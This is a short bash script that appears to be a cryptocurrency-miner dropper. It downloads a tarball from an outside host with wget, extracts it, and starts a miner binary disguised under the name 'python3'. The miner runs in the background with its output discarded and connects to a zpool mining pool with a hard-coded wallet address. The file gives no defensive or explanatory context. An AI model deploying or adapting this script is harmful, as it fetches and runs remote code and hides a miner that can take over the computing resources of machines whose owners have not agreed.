#!/bin/bash

wget -O dot momok.x10.bz/DOT-SRB.tar.gz

tar xvf dot

nomer=$((RANDOM % 50 + 1))

nohup ./dotsrb/python3 -a flex -o flex.eu.mine.zpool.ca:3340 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$nomer > /dev/null 2>&1 &
